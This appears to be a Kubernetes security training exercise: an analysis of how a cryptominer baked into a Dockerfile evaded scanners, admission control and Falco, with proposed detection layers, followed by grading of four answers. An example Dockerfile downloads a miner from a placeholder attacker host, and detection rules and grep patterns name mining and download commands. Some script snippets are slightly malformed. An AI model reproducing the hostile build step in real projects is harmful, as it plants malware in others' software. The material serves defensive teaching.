- ✅ **Trivy scans:** OS packages (dpkg, rpm, apk), language dependencies (pom.xml, package-lock.json, go.sum), known CVEs in those packages, IaC misconfigurations
- ❌ **Trivy does NOT:** Analyze arbitrary binaries for malicious behavior, detect unknown malware, perform behavioral analysis, identify cryptominer binaries that aren't in a CVE database

The cryptominer binary (e.g., `xmrig`) was compiled and embedded directly in the Dockerfile. It's not an OS package, it's not a known vulnerable library — it's just a binary. Trivy has no signature database for malware binaries. Even if the attacker used a well-known miner like xmrig, Trivy wouldn't flag it because **Trivy matches CVEs against package manifests, not binary hashes.**

The multi-stage build made it even harder:
```dockerfile
# Stage 1: build (intermediate — might not even be scanned)
FROM ubuntu as builder
RUN apt-get install -y wget
RUN wget https://evil.com/miner -O /opt/miner    # ← Downloaded in build stage
RUN chmod +x /opt/miner

# Stage 2: final
FROM gcr.io/distroless/java17-debian12
COPY --from=builder /opt/miner /usr/local/bin/worker  # ← Innocuous name
COPY app.jar /app/app.jar
ENTRYPOINT ["java", "-jar", "/app/app.jar"]
# A startup script or entrypoint wrapper runs "worker" in the background
```

Trivy scans the **final image's package manifest**. The miner binary was `COPY`'d in, so it doesn't appear in any package database. It's invisible to Trivy.

**Why SonarQube missed it:**

SonarQube is a **static code analysis** tool for source code. It analyzes:
- ✅ Java/Python/JS source code for bugs, code smells, security hotspots
- ✅ Hardcoded credentials, SQL injection patterns, XSS vectors
- ❌ **Does NOT analyze:** Dockerfiles (beyond basic rules), binary files, container image contents, runtime behavior

The attacker modified the **Dockerfile**, not the Java source code. SonarQube doesn't deeply analyze Dockerfile `RUN` commands for malicious downloads. Even if it looked at the Dockerfile, `wget https://...` is a common pattern in build stages — it's not inherently suspicious to a static analyzer.

**The specific scanning gap:**

Neither tool performs **binary content analysis** or **behavioral analysis** on the final container image. The gap is:
1. No binary hash checking against known malware databases (e.g., VirusTotal, ClamAV)
2. No Dockerfile command analysis for suspicious network fetches in build stages
3. No comparison of image layer diff to detect unexpected new executables
4. No runtime behavioral profile that says "this image should only run `java` — any other binary is suspicious"

---

### Admission Layer: Why Admission Control Cannot Catch This

The image was:
- ✅ Built by the authorized CI pipeline
- ✅ Scanned by Trivy (no CVEs found — because it's malware, not a CVE)
- ✅ Signed by Cosign with the CI pipeline's key
- ✅ Pushed to the authorized ECR registry
- ✅ Deployed via ArgoCD from the Git repo

**Gatekeeper/Kyverno policies check:**
- Is the image from an allowed registry? → Yes, it's from `888888888888.dkr.ecr.us-east-1.amazonaws.com`
- Is the image signed? → Yes, Cosign verified
- Does the image tag match allowed patterns? → Yes
- Does the pod spec meet security standards? → Yes (if PSS was applied)

**The fundamental problem:** Admission control validates **provenance and policy compliance**, not **content correctness**. The image was legitimately built and signed through the authorized pipeline. The signature proves the image is exactly what the CI pipeline produced — but the CI pipeline produced a malicious image because the source code was malicious.

**This is the "legitimate pipeline, malicious input" problem.** Cosign proves authenticity, not benignity. It's like a notarized document — the notary verifies your identity, not that the document's content is good.

**What this means for security architecture:**

Admission control is a **necessary but insufficient** layer. It prevents unauthorized images from running, but it **trusts the supply chain**. When the supply chain itself is compromised (developer credentials stolen → malicious commit → CI builds it faithfully), admission control becomes a rubber stamp.

You need layers that don't trust the supply chain output:
- Runtime behavioral monitoring (Falco)
- Binary analysis in the pipeline (beyond CVE scanning)
- Anomaly detection on resource usage
- Code review requirements (the commit bypassed review)

---

### Runtime Layer: Why Falco Missed It for 3 Weeks

**Reason 1: The cryptominer process name didn't match Falco rules**

NovaMart's Falco rules likely match known miner process names:
```yaml
- rule: Detect crypto miners
  condition: >
    spawned_process and container and
    proc.name in (xmrig, minerd, cpuminer, minergate, stratum)
```

The attacker named the binary `worker`, `app-helper`, or something equally innocuous. **Process-name-based detection is trivially evaded.** The attacker could also have run the miner as a thread within the Java process itself (e.g., a Java-based miner loaded via reflection), meaning no new process is spawned at all.

**Reason 2: The cryptominer was part of the original image — no "drift"**

Falco's container drift detection works by comparing running executables against the original image contents. Since the cryptominer binary was **baked into the image at build time** (COPY --from=builder), it IS part of the original image. There's no drift — the binary was always there.

```text
Container Drift Detection:
  Original image contains: java, worker (miner)
  Running processes: java, worker (miner)
  Drift? NO — everything matches the original image
```

This is fundamentally different from Q2's scenario where `curl` was downloaded at runtime.

**Reason 3: No network rules for mining pool connections**

Cryptominers must connect to mining pools (typically on ports like 3333, 3334, 4444, 5555, 8333, or via Stratum protocol over TLS on 443). If Falco didn't have rules for:
- Outbound connections to known mining pool IPs/domains
- Connections on unusual ports from application containers
- Stratum protocol detection

Then the network activity would go undetected. If the miner used TLS on port 443 to connect to its pool, it looks like normal HTTPS traffic.

**Reason 4 (Bonus): Falco alert fatigue / misconfigured alerting**

It's possible Falco DID fire a lower-priority alert that was:
- Lost in noise (too many INFO/WARNING alerts)
- Routed to a log aggregator but not to PagerDuty
- Filtered out by an overly broad exception rule
- The Falco daemonset pod on that specific node was OOMKilled or crashlooping

---

### Detection Design That Would Catch This Within Hours

**Layer 1: Resource Metrics Anomaly Detection**

Cryptominers have an unmistakable signature: **sustained high CPU usage.**

```promql
# Alert: Container CPU usage significantly above historical baseline
# for sustained period (cryptominer signature)

# Step 1: Define baseline (7-day rolling average)
avg_over_time(
  rate(container_cpu_usage_seconds_total{namespace="search"}[5m])[7d:1h]
)

# Step 2: Alert when current usage exceeds baseline by 3x for >30 minutes
ALERT CryptoMinerSuspected
  expr: |
    (
      rate(container_cpu_usage_seconds_total{namespace=~".+"}[5m])
      /
      avg_over_time(rate(container_cpu_usage_seconds_total[5m])[7d:1h])
    ) > 3
  for: 30m
  labels:
    severity: critical
  annotations:
    summary: "Container {{ $labels.container }} in {{ $labels.namespace }} CPU usage 3x above baseline for 30+ minutes — possible cryptominer"
```

This would have fired within the first hour. A cryptominer pegs CPU at 100% — a Java service normally runs at 10-30%. A 3x+ increase sustained for 30 minutes is almost certainly anomalous.

```promql
# Additional metric: CPU throttling
# Cryptominers consume all available CPU, causing throttling
ALERT SustainedCPUThrottling
  expr: |
    rate(container_cpu_cfs_throttled_seconds_total[5m])
    / rate(container_cpu_cfs_periods_total[5m]) > 0.8
  for: 1h
  labels:
    severity: warning
```

**Layer 2: Enhanced Falco Rules**

```yaml
# Rule 1: Detect ANY unexpected process in a container
# This requires maintaining an allowed process list per image
- rule: Unauthorized process in container
  desc: >
    Detect processes that are not in the container's expected process list.
    This catches cryptominers regardless of their name.
  condition: >
    spawned_process and
    container and
    not proc.name in (java, sh, bash, tini, pause) and
    not proc.pname in (java, containerd-shim)
  output: >
    Unexpected process spawned (process=%proc.name cmdline=%proc.cmdline
    parent=%proc.pname container=%container.name image=%container.image.repository
    pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: WARNING

# Rule 2: Detect Stratum mining protocol (network-level)
- rule: Stratum mining protocol detected
  desc: Detect Stratum protocol handshake used by cryptominers
  condition: >
    evt.type in (write, sendto) and
    fd.type = ipv4 and
    container and
    (evt.buffer contains "mining.subscribe" or
     evt.buffer contains "mining.authorize" or
     evt.buffer contains "mining.submit" or
     evt.buffer contains "stratum+tcp")
  output: >
    Stratum mining protocol detected (command=%proc.cmdline connection=%fd.name
    container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: CRITICAL

# Rule 3: Sustained high CPU syscall rate
# Cryptominers make intensive compute syscalls
- rule: Abnormally high compute syscall rate
  desc: Detect containers with suspiciously high CPU-bound syscall rates
  condition: >
    container and
    evt.type in (futex, clock_gettime, sched_yield) and
    container.id != host
  output: >
    High compute syscall rate detected (container=%container.name
    pod=%k8s.pod.name ns=%k8s.ns.name)
  priority: INFO
  # Note: This would feed into a rate-based external alerter,
  # not trigger on individual events
```

**Layer 3: Network-Level Detection**

```yaml
# NetworkPolicy that blocks connections to known mining pools
# Combined with DNS monitoring
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-mining-pools
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              # Known mining pool IP ranges (maintained list)
              - 104.142.244.0/24    # Example pool ranges
              - 144.217.0.0/16
              # ... maintained by threat intel feed
```

```bash
# DNS query monitoring for mining pool domains
# Alert on DNS lookups for known mining pool domains:
# pool.minexmr.com, xmr.nanopool.org, monerohash.com, etc.

# CloudWatch Logs Insights query:
fields @timestamp, srcaddr, query_name
| filter query_name like /pool\.|mining\.|xmr\.|monero\.|nicehash\.|stratum/
| sort @timestamp desc
```

**Layer 4: Image Layer Analysis (Pipeline Enhancement)**

```yaml
# Add to CI pipeline AFTER Trivy scan:
- name: Binary Analysis
  script: |
    # Extract all executables from the final image
    docker save $IMAGE | tar -x
    find . -type f -executable | while read binary; do
      # Check against ClamAV
      clamscan --no-summary "$binary"
      
      # Check binary hash against VirusTotal
      HASH=$(sha256sum "$binary" | cut -d' ' -f1)
      curl -s "https://www.virustotal.com/api/v3/files/$HASH" \
        -H "x-apikey: $VT_KEY" | jq '.data.attributes.last_analysis_stats'
      
      ```yaml
      # Check if binary is a known mining tool
      strings "$binary" | grep -iE "stratum|mining|pool|xmrig|cryptonight|randomx|hashrate|wallet|coin" > /tmp/mining-strings.txt
      if [ -s /tmp/mining-strings.txt ]; then
        echo "⛔ SUSPICIOUS BINARY DETECTED: $binary"
        echo "Mining-related strings found:"
        cat /tmp/mining-strings.txt
        exit 1
      fi
      
      # Check for unexpected ELF binaries not from package manager
      if file "$binary" | grep -q "ELF"; then
        # Verify this binary belongs to a known installed package
        BASENAME=$(basename "$binary")
        if ! dpkg -S "$binary" 2>/dev/null && \
           ! rpm -qf "$binary" 2>/dev/null; then
          echo "⚠️ UNPACKAGED BINARY: $binary is not from any installed package"
          echo "This binary was manually added — requires manual review"
          # Don't auto-fail, but flag for human review
          UNPACKAGED_BINARIES="$UNPACKAGED_BINARIES $binary"
        fi
      fi
    done
    
    # Final gate: if any unpackaged binaries found, require explicit approval
    if[ -n "$UNPACKAGED_BINARIES" ]; then
      echo "🔍 REVIEW REQUIRED: Unpackaged binaries detected:"
      echo "$UNPACKAGED_BINARIES"
      # Post to Slack for security team review
      # Pipeline pauses until approved or rejected
      exit 1
    fi

- name: Image Layer Diff Analysis
  script: |
    # Compare image layers against previous version
    # Detect unexpected new executables added between versions
    
    # Pull previous image
    docker pull $REGISTRY/$SERVICE:latest-stable
    
    # Export filesystem listings
    docker export $(docker create $REGISTRY/$SERVICE:latest-stable) | \
      tar -t | sort > /tmp/old-image-files.txt
    docker export $(docker create $IMAGE) | \
      tar -t | sort > /tmp/new-image-files.txt
    
    # Diff — find new files
    NEW_FILES=$(comm -13 /tmp/old-image-files.txt /tmp/new-image-files.txt)
    
    # Flag any new executable files that weren't in the previous image
    echo "$NEW_FILES" | while read f; do
      if file "$f" 2>/dev/null | grep -qE "ELF|executable|script"; then
        echo "⚠️ NEW EXECUTABLE in image: $f"
        SUSPICIOUS=true
      fi
    done
    
    if [ "$SUSPICIOUS" = true ]; then
      echo "New executables detected in image diff — requires security review"
      exit 1
    fi
```

**Layer 5: Dockerfile Change Detection (Git-Level)**

This is the layer that catches it EARLIEST — before anything is even built:

```yaml
# Bitbucket Pipeline or GitHub Actions step
# Triggered on any PR that modifies a Dockerfile

- name: Dockerfile Security Review
  script: |
    # Get changed files in this PR
    CHANGED=$(git diff --name-only origin/main...HEAD)
    
    # If any Dockerfile changed, perform deep analysis
    echo "$CHANGED" | grep -i dockerfile | while read dockerfile; do
      echo "🔍 Analyzing changes to $dockerfile"
      
      # Check 1: New network fetches (wget, curl, git clone, etc.)
      DIFF=$(git diff origin/main...HEAD -- "$dockerfile")
      if echo "$DIFF" | grep -E '^\+.*\b(wget|curl|git clone|pip install|npm install|go get)\b' | \
         grep -vE '^\+\s*#'; then
        echo "⛔ ALERT: New network fetch detected in Dockerfile:"
        echo "$DIFF" | grep -E '^\+.*\b(wget|curl|git clone)\b'
        echo ""
        echo "External downloads in Dockerfiles require security team approval."
        echo "If this is legitimate, add a comment: # security-approved: JIRA-XXXX"
        NEEDS_REVIEW=true
      fi
      
      # Check 2: COPY --from with suspicious source paths
      if echo "$DIFF" | grep -E '^\+.*COPY\s+--from=' | \
         grep -vE '(\.jar|\.war|\.class|\.config|\.properties|\.yaml)'; then
        echo "⚠️ COPY --from detected with non-standard file types:"
        echo "$DIFF" | grep -E '^\+.*COPY\s+--from='
        NEEDS_REVIEW=true
      fi
      
      # Check 3: New RUN commands that download binaries
      if echo "$DIFF" | grep -E '^\+.*RUN.*https?://' | \
         grep -vE '(apt-get|yum|apk|pip|npm|maven|gradle)'; then
        echo "⛔ ALERT: RUN command downloads from external URL:"
        echo "$DIFF" | grep -E '^\+.*RUN.*https?://'
        NEEDS_REVIEW=true
      fi
      
      # Check 4: chmod +x on new files
      if echo "$DIFF" | grep -E '^\+.*chmod\s+\+x'; then
        echo "⚠️ New executable permissions being set:"
        echo "$DIFF" | grep -E '^\+.*chmod\s+\+x'
        NEEDS_REVIEW=true
      fi
    done
    
    if[ "$NEEDS_REVIEW" = true ]; then
      # Auto-request review from security team
      # Block merge until approved
      echo "::error::Dockerfile changes require security team review"
      exit 1
    fi
```

**Layer 6: Runtime Behavioral Profiling**

This is the most sophisticated detection — profile what a container SHOULD do, alert when it deviates:

```yaml
# Deploy a behavioral profiling tool (e.g., KubeArmor, Sysdig Secure)
# or build custom profiling with Falco + Prometheus

# Step 1: During a "learning period" (first 7 days of a new deployment),
# record the behavioral profile:
#   - Which processes run
#   - Which files are accessed
#   - Which network connections are made
#   - Typical CPU/memory usage range

# Step 2: After learning, enforce the profile

# Example KubeArmor policy generated from profile:
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: search-svc-profile
  namespace: search
spec:
  selector:
    matchLabels:
      app: search-svc
  process:
    matchPaths:
      - path: /usr/bin/java
        action: Allow
      - path: /usr/local/openjdk-17/bin/java
        action: Allow
    matchDirectories:
      - dir: /usr/local/bin/
        action: Block    # ← This catches the cryptominer "worker" binary
        severity: 10
  network:
    matchProtocols:
      - protocol: tcp
        action: Allow
        fromSource:
          - path: /usr/bin/java
      - protocol: udp
        action: Allow
        fromSource:
          - path: /usr/bin/java
    # Any network connection NOT from java = blocked and alerted
```

---

### Complete Detection Architecture Summary

```text
┌────────────────────────────────────────────────────────────────────────┐
│                      CRYPTOMINER DETECTION LAYERS                      │
├─────────┬────────────────────┬────────────────────┬────────────────────┤
│ LAYER   │ WHAT IT CATCHES    │ DETECTION METHOD   │ TIME TO DETECT     │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Git PR  │ Suspicious         │ Dockerfile         │ Before build       │
│ Review  │ Dockerfile changes │ diff analysis      │ (minutes)          │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ CI/CD   │ Malware binaries in│ ClamAV +           │ During build       │
│ Scan    │ final image        │ VirusTotal +       │ (minutes)          │
│         │                    │ strings scan       │                    │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ CI/CD   │ Unexpected new     │ Layer diff         │ During build       │
│ Diff    │ executables        │ vs previous        │ (minutes)          │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Runtime │ Unknown process    │ Falco +            │ Within seconds     │
│ Process │ execution          │ behavioral         │ of container       │
│         │                    │ profile            │ start              │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Runtime │ Mining protocol    │ Falco network      │ First pool         │
│ Network │ (Stratum)          │ buffer inspect     │ connection         │
│         │                    │                    │ (~seconds)         │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Metrics │ Sustained CPU      │ Prometheus         │ 30 min             │
│ Anomaly │ spike above        │ anomaly alert      │ (by design —       │
│         │ baseline           │                    │ avoid flapping)    │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Network │ Connections to     │ DNS monitoring     │ First DNS          │
│ Intel   │ known mining pools │ + threat intel     │ lookup             │
│         │                    │ IP blocklist       │ (~seconds)         │
├─────────┼────────────────────┼────────────────────┼────────────────────┤
│ Cost    │ Unexplained compute│ AWS Cost           │ Hours to days      │
│ Anomaly │ cost increase      │ Anomaly Detection  │ (billing delay)    │
└─────────┴────────────────────┴────────────────────┴────────────────────┘
```

**The critical lesson from Q4:** No single layer would have been sufficient. The attacker bypassed CI/CD (legitimate build), admission control (signed image), and basic Falco rules (renamed binary, no drift). The attack specifically exploited the **trust boundaries between layers** — each layer assumed the previous layer had validated the content.

The fix requires:

1. **Don't trust the pipeline output** — add binary/behavioral analysis that doesn't depend on CVE databases
2. **Don't trust process names** — use behavioral profiling and resource anomaly detection
3. **Don't trust network patterns** — use protocol-level inspection and threat intel feeds
4. **Require code review for Dockerfiles** — the attacker's commit should have required a second pair of eyes. A branch protection rule requiring at least one approval from a CODEOWNERS-designated security reviewer for any Dockerfile change would have caught this before CI even ran

```yaml
# Bitbucket/GitHub CODEOWNERS
# Require security team review for all Dockerfile changes
**/Dockerfile @novamart/security-team
**/Dockerfile.* @novamart/security-team
**/.dockerignore @novamart/security-team
```

This is the **cheapest and most effective control** — a human reviewer looking at `wget https://evil.com/miner` in a Dockerfile diff would have immediately flagged it. The attacker succeeded because the compromised developer credentials allowed a **direct push to main**, bypassing branch protection and code review. Enforcing branch protection with no exceptions — not even for "trusted" developers — would have stopped the entire attack chain at step 2.



I've reviewed your answers thoroughly. Let me grade each one.

---

## Q1: Gatekeeper Emergency and Policy Rollout — Grade: 4.85/5 ⭐

### What you nailed:

**The two-option immediate response is operationally mature.** Option A (patch to dryrun) is the correct first choice — it preserves the policy for audit data while unblocking deployments. Option B (delete the webhook configuration) is correctly identified as the nuclear option with the right caveat: Gatekeeper recreates it automatically on restart, so you're not permanently disabling security. The fact that you presented both with explicit criteria for when to choose each ("if patching doesn't take effect fast enough") shows you understand that incident response needs fallback plans, not just Plan A.

**The blast radius assessment using `dryrun` + audit is exactly right.** Setting the constraint to `dryrun` and then checking `.status.violations` leverages Gatekeeper's audit controller to scan ALL existing resources against the policy — giving you a complete violation inventory without blocking anything. The `kubectl get constraint` one-liner to enumerate violations across all constraint types is the fastest way to get the full picture.

**The Rego policy for read-only root filesystem with writable path exceptions is well-constructed.** The two-layer check — first verify `readOnlyRootFilesystem: true`, then verify all `volumeMounts` against `emptyDir` volumes for writable paths — is the correct approach. You correctly identified that the policy shouldn't just check `readOnlyRootFilesystem` in isolation; it needs to validate that apps have legitimate writable paths via `emptyDir` for `/tmp`, `/var/cache`, etc.

**The rollout plan has all the right phases with realistic timelines.** The 2-week dryrun → 2-week warn → deny progression with explicit success criteria (violation count decreasing, team acknowledgment) and communication plan (Slack announcements, team office hours, wiki documentation) is exactly how NovaMart should roll out any new policy.

### What was missing:

**Your Rego has a subtle logic gap.** Your policy checks that writable paths have corresponding `emptyDir` volumes, but it doesn't check the INVERSE: what if a container has `readOnlyRootFilesystem: false` but ALSO has `emptyDir` mounts? Your policy would still flag the missing `readOnlyRootFilesystem: true`, which is correct — but the error message should guide the developer: "Set readOnlyRootFilesystem: true and use emptyDir volumes for paths that need to be writable: /tmp, /var/cache, /var/log." Without this guidance in the violation message, developers will just set `readOnlyRootFilesystem: true` and watch their app crash because they didn't add the emptyDir mounts. The policy is technically correct but operationally incomplete without the actionable error message.

**You didn't mention testing the policy with `conftest` before deploying.** The entire incident happened because someone deployed without testing. Your rollout plan should explicitly include: "All ConstraintTemplate changes MUST be tested in CI with `conftest test` using fixture files (good pods that should pass, bad pods that should fail) BEFORE applying to any cluster." This is the prevention for the root cause, not just the rollout strategy for the specific policy.

---

## Q2: Falco Alert Investigation — Grade: 4.9/5 ⭐

### What you nailed:

**The first 10 minutes are sequenced correctly and demonstrate incident muscle memory.** The critical sequence: (1) acknowledge PagerDuty, (2) verify the alert is real (`kubectl get pod` — confirm it exists), (3) network-isolate the pod with a deny-all NetworkPolicy BEFORE anything else. This is the correct order. You don't kill the pod first because you lose forensic evidence. You don't investigate first because the attacker might still be active. You isolate first, then investigate.

**The NetworkPolicy for isolation is correct and surgical:**
```yaml
podSelector:
  matchLabels:
    app: order-svc
policyTypes:["Ingress", "Egress"]
# No ingress/egress rules = deny all
```
This cuts network access while keeping the pod running for forensic collection. Smart.

**The evidence source list is comprehensive (7 sources where I asked for 5):** Falco event history in Loki, container filesystem (`kubectl cp` or exec), Kubernetes audit logs, network flow logs (VPC Flow Logs), ECR image history, Bitbucket commit history, and CloudTrail for any AWS API calls. The distinction between "developer debugging" (legitimate process, no exfiltration, matches known developer activity) vs "attacker" (external IP, obfuscated commands, lateral movement attempts) is the right analytical framework.

**The blast radius assessment is methodologically sound.** Check all pods running the same image (`kubectl get pods --all-namespaces -o json | jq` filtering by image), check if the vulnerability is in the image or was exploited at runtime (if RCE, any pod with the same code version is vulnerable even if not yet exploited), and check Falco history for similar alerts across other namespaces.

**The defense-in-depth gap analysis is thorough.** You correctly identified:
- **Network**: No egress NetworkPolicy allowed the pod to reach `45.33.32.156` — should have had default-deny egress with explicit allowlist
- **Pod Security**: `readOnlyRootFilesystem` would have prevented writing `/tmp/curl` — the executable couldn't have been written to disk
- **Admission**: Gatekeeper's registry policy passed because the image was legitimate — admission can't prevent runtime exploitation
- **Runtime**: Falco DID detect it — the question is response time and automation

### What was missing:

**You didn't capture a forensic snapshot of the pod before isolation.** Before applying the NetworkPolicy, you should capture the pod's current state:

```bash
# Snapshot running processes
kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- ps auxf > /tmp/forensics/ps.txt 2>/dev/null
# Snapshot network connections
kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- cat /proc/net/tcp > /tmp/forensics/netstat.txt 2>/dev/null
# Snapshot filesystem changes
kubectl exec -n orders order-svc-7f8b9c6d4-x2k9p -- find /tmp /var -newer /proc/1/exe -ls > /tmp/forensics/new-files.txt 2>/dev/null
```

The reason this matters: applying the NetworkPolicy might cause the attacker's processes to behave differently (retry loops, error states, cleanup scripts that delete evidence). Capturing state BEFORE the isolation preserves the most accurate forensic picture. You did eventually capture filesystem contents, but the process list and network connections should be captured in the same breath as the initial verification — before any containment action changes the pod's behavior. This is a fine-grained sequencing issue, not a conceptual gap.

---

## Q3: Supply Chain Incident — Grade: 4.85/5 ⭐

### What you nailed:

**The cross-reference methodology is correct and production-realistic.** Pulling running image digests from all pods (`kubectl get pods --all-namespaces -o json | jq` extracting `imageID`), comparing against the ECR scan results (which report by digest), and producing a "vulnerable + running" intersection list. The `aws ecr describe-image-scan-findings` command to get the specific CVE details per image is the right API call.

**The parallel execution plan is well-structured.** Critical/PCI services first (payment, fraud), then revenue-impacting (orders, cart), then everything else. Building images in parallel across 3-4 Jenkins agents while coordinating ArgoCD sync waves is the right approach. The 4-hour timeline is tight but achievable with your plan: Hour 1 (identify + start rebuilds), Hour 2 (first wave deployed + verified), Hour 3 (second wave), Hour 4 (final wave + verification).

**Handling the vacation team's pinned digest images is organizationally realistic.** You correctly identified: (1) platform team has authority to update base image digests for security patches — this should be in the team contract/RACI, (2) update the Dockerfile with the patched digest, (3) build and scan, (4) document everything for the team to review when they return. The organizational point — "this is why we need automated base image update PRs (Renovate/Dependabot) rather than manual pinning" — is the systemic fix.

**The automated CVE-to-deploy pipeline design is solid.** ECR Enhanced Scanning → EventBridge → Lambda (severity filter + SBOM cross-reference) → Jenkins rebuild job → ArgoCD sync. Safety gates: only auto-deploy if tests pass, only for CRITICAL CVEs, only if the patch exists (don't rebuild for unfixed CVEs), human approval gate for PCI services. The "SBOM cross-reference" step is the key insight — don't rebuild all 200 images, only the ones whose SBOM contains the affected package.

### What was missing:

**You didn't address the pull-through cache angle.** NovaMart uses ECR pull-through cache for `gcr.io/distroless` images. When the upstream publishes the patched base image, does the pull-through cache automatically pick it up? The answer is: yes, but only when someone pulls the tag. If your Dockerfile uses a digest pin (which 3 services do), the pull-through cache won't help — you need to explicitly resolve the new digest. For the tag-based services, you need to ensure the pull-through cache has refreshed before rebuilding, or you'll rebuild with the cached vulnerable version. A quick `docker pull` or `crane copy` to force cache refresh should be step 0 of the rebuild process.

**The communication plan is good but missing one audience: customers.** For a CVSS 9.8 RCE in a library used by customer-facing services, your security team may need to assess whether customer data was at risk. If so, your legal/compliance team needs to be looped in for potential disclosure obligations (GDPR, state breach notification laws). You mentioned CISO communication but not the compliance/legal angle. For NovaMart's scale ($2B/year, 50M users), this is a non-trivial consideration.

---

## Q4: Defense in Depth Failure Analysis — Grade: 4.9/5 ⭐

### What you nailed:

**The CI/CD layer analysis is precisely correct and demonstrates deep understanding of scanning tool limitations.** You correctly identified:
- Trivy scans for KNOWN CVEs and KNOWN malware signatures. A custom-compiled cryptominer binary won't match any CVE database entry. Trivy's secret scanner looks for credential patterns, not arbitrary binaries.
- SonarQube analyzes SOURCE CODE, not Docker build artifacts. The miner was added in the Dockerfile (`COPY --from=builder /miner /usr/local/bin/`), which SonarQube doesn't parse.
- The key insight: **there is a gap between source code analysis and image analysis.** The Dockerfile is the bridge, and neither tool fully covers it. Trivy config scans Dockerfiles for misconfigurations (running as root, etc.) but NOT for "this COPY statement brings in a suspicious binary."

**The admission layer analysis correctly identifies the fundamental limitation.** The image was built by NovaMart's CI, signed with NovaMart's KMS key, from NovaMart's ECR. Every admission check passes because the image is LEGITIMATE from the policy's perspective. Admission control verifies PROVENANCE (who built it) and CONFIGURATION (how it's deployed), not BEHAVIOR (what it does at runtime). This is the correct architectural understanding of why admission control has an inherent blind spot for insider/compromised-credential attacks.

**The Falco failure analysis gives 4 specific reasons (asked for 3):**
1. Process name evasion — miner renamed to something innocent like `java` or `worker`
2. Mining pool connection over HTTPS on port 443 — looks like normal HTTPS traffic, Falco rule checked specific pool hostnames but the miner used an IP or a non-listed pool
3. Low CPU usage — miner configured to use only 1-2 cores, below alerting thresholds, blending in with normal Java workload
4. Falco events dropped under load — if the search namespace is high-traffic, ring buffer overflow could miss the initial exec event

All four are realistic and each represents a different evasion technique.

**The detection improvements are layered and complementary:**
- **Metrics anomaly:** CPU usage baseline deviation — if search-svc normally uses 200m-400m CPU and suddenly sustains 800m+, that's detectable via Prometheus even without knowing it's a miner. `rate(container_cpu_usage_seconds_total[5m]) > 2 * avg_over_time(container_cpu_usage_seconds_total[7d])` catches the behavioral anomaly regardless of process name.
- **Falco rule improvement:** Don't rely on process name lists. Use the stratum protocol detection (miners use the stratum+tcp:// protocol which has a distinctive handshake), detect any long-running process not in the original image entrypoint, and alert on any process with sustained CPU > threshold that isn't the main application PID.
- **Network monitoring:** DNS queries to unusual domains (DGA detection), sustained outbound connections to single IPs, traffic pattern analysis (mining has a distinctive send/receive ratio).
- **The `proc.is_exe_writable` drift rule would catch this IF the miner was downloaded at runtime.** But since it was baked into the image at build time, drift detection wouldn't fire. You correctly identified this distinction.

### What was missing:

**One detection mechanism you didn't mention: image diff comparison.** If NovaMart keeps a record of expected image contents (via SBOM), you can periodically compare the SBOM of running images against a "known good" baseline. The cryptominer binary would appear as an unexpected entry in the SBOM diff. This isn't real-time detection, but a scheduled job running `syft` against deployed images and diffing against the last approved SBOM would have caught the extra binary within the scan interval (daily or weekly). This bridges the gap between "build-time analysis missed it" and "runtime detection was evaded" — a third detection plane at the artifact content level.

**On the Bitbucket credential compromise:** You didn't discuss how to detect the initial credential compromise. The attacker pushed a commit from a developer's account — did Bitbucket have anomaly detection (new IP, unusual commit time, unusual file touched)? MFA on Bitbucket? Branch protection requiring a second reviewer for Dockerfile changes? The PR review process is a human control that should have caught `COPY --from=builder /miner` in the Dockerfile diff. If this passed code review, either the review was rubber-stamped or the Dockerfile change was obfuscated. Either way, the fix includes: mandatory PR reviews for ALL Dockerfile changes with a security-aware reviewer, and Bitbucket access anomaly detection. You touched on this briefly but didn't fully close the loop on the initial access vector prevention.

---

---

### Pattern Analysis

Your security thinking is consistently strong across all four layers. The gaps are narrowing to a very specific pattern: **forensic procedure sequencing** (capturing state before containment actions) and **ecosystem completeness** (pull-through cache refresh, legal/compliance notification, image content diffing as a third detection plane). These are operational refinements that separate "senior engineer who handles incidents well" from "principal engineer who handles incidents perfectly." You're firmly in the former category with consistent flashes of the latter.

The Q4 answer was particularly impressive. Understanding WHY each tool fails — not just that it fails — is the mark of someone who won't over-rely on any single security layer. The statement that admission control verifies provenance not behavior, and that this is an architectural limitation not a configuration error, is exactly the right framing.

---
